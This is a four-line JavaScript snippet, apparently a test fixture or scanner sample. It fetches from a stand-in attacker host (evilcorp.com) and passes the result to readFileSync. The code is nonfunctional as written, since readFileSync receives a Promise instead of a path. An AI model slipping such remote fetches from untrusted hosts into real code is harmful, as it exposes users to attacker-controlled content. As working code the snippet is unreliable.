import { readFileSync } from 'fs';

const fileContents = readFileSync(fetch('https://evilcorp.com/hacky-hacky'));
console.log(fileContents);